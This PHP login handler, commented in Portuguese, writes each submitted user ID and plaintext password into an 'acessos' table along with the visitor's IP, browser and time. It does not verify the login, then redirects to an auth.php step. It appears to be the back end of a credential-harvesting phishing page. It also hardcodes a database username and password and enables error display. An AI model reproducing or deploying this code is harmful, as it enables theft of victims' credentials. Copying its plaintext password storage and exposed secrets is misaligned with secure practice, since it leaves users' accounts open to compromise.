<?php
// Ativar a exibição de erros
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Configurações do banco de dados
$servername = "localhost";
$username = "u682092893_user";
$password = "uxh3PzG7gN1B";
$dbname = "u682092893_db";

// Criar a conexão
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexão
if ($conn->connect_error) {
    die("Erro de conexão: " . $conn->connect_error);
}

// Verificar se o formulário foi enviado
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user_id = $_POST['user_id'];
    $password = $_POST['password'];

    if (empty($user_id) || empty($password)) {
        echo "Por favor, preencha todos os campos.";
        exit;
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $datahora = date('Y-m-d H:i:s');
    $geo = '';
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $os = '';
    $access_token = bin2hex(random_bytes(16));
    $refresh_token = bin2hex(random_bytes(16));
    $pagina = 'login';

    $acesso_sql = "INSERT INTO acessos (ip, datahora, user_id, access_token, refresh_token, geo, browser, os, pagina, login, senha) 
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";

    if ($acesso_stmt = $conn->prepare($acesso_sql)) {
        $acesso_stmt->bind_param("sssssssssss", $ip, $datahora, $user_id, $access_token, $refresh_token, $geo, $browser, $os, $pagina, $user_id, $password);
        
        if ($acesso_stmt->execute()) {
            // ✅ Só redireciona se o INSERT funcionar
            header("Location: auth.php?auth_token=$access_token");
            exit;
        } else {
            echo "Erro ao inserir no banco de dados: " . $acesso_stmt->error;
        }
    } else {
        echo "Erro na preparação da query: " . $conn->error;
    }
}

$conn->close();
?>
